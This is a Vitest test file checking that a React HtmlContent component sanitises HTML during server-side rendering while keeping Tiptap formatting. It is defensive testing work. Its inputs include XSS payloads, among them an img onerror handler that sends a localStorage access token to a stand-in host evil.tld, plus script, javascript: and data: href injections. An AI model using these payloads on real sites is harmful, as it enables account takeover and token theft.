import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'

import { HtmlContent } from './html-content'

// Rendered through react-dom/server on purpose: that is the SSR path, where
// a browser-only sanitiser would silently no-op and emit the raw markup
// into the initial HTML payload.
function render(html: string): string {
  return renderToStaticMarkup(<HtmlContent html={html} />)
}

describe('HtmlContent sanitisation', () => {
  it('strips a script tag', () => {
    const out = render('<p>hi</p><script>alert(document.cookie)</script>')

    expect(out).not.toContain('<script')
    expect(out).not.toContain('alert(')
    expect(out).toContain('<p>hi</p>')
  })

  it('strips an inline event handler used to steal the localStorage JWT', () => {
    // This is the payload that matters: web keeps accessToken/refreshToken
    // in localStorage, so any executing script is account takeover.
    const out = render('<img src="x" onerror="fetch(\'https://evil.tld/?t=\'+localStorage.accessToken)">')

    expect(out).not.toContain('onerror')
    expect(out).not.toContain('localStorage')
  })

  it('strips a javascript: href', () => {
    const out = render('<a href="javascript:alert(1)">click</a>')

    expect(out).not.toContain('javascript:')
    expect(out).toContain('click')
  })

  it('strips an iframe', () => {
    const out = render('<iframe src="https://evil.tld"></iframe>')

    expect(out).not.toContain('<iframe')
  })

  it('strips svg-based script execution', () => {
    const out = render('<svg><script>alert(1)</script></svg>')

    expect(out).not.toContain('<script')
    expect(out).not.toContain('alert(1)')
  })

  it('keeps the formatting Tiptap legitimately produces', () => {
    const out = render(
      '<p>Ship <strong>the</strong> <em>feature</em></p><ul><li>one</li><li>two</li></ul><a href="https://example.com">docs</a>',
    )

    expect(out).toContain('<strong>the</strong>')
    expect(out).toContain('<em>feature</em>')
    expect(out).toContain('<li>one</li>')
    expect(out).toContain('href="https://example.com"')
  })

  it('keeps headings, blockquotes, code and tables', () => {
    const out = render(
      '<h2>Title</h2><blockquote>quote</blockquote><pre><code>const a = 1</code></pre><table><tbody><tr><td>cell</td></tr></tbody></table>',
    )

    expect(out).toContain('<h2>Title</h2>')
    expect(out).toContain('<blockquote>quote</blockquote>')
    expect(out).toContain('const a = 1')
    expect(out).toContain('<td>cell</td>')
  })

  it('strips a vbscript: href', () => {
    const out = render('<a href="vbscript:msgbox(1)">click</a>')

    expect(out).not.toContain('vbscript:')
    expect(out).toContain('click')
  })

  it('keeps a data: image the editor pasted but not a data: href', () => {
    const img = render('<img src="data:image/png;base64,AAAA" alt="pasted">')
    expect(img).toContain('data:image/png;base64,AAAA')

    const link = render('<a href="data:text/html,<script>alert(1)</script>">click</a>')
    expect(link).not.toContain('data:text/html')
  })

  it('keeps an inline image the editor embedded', () => {
    const out = render('<img src="https://example.com/a.png" alt="a" width="100">')

    expect(out).toContain('src="https://example.com/a.png"')
    expect(out).toContain('alt="a"')
  })
})
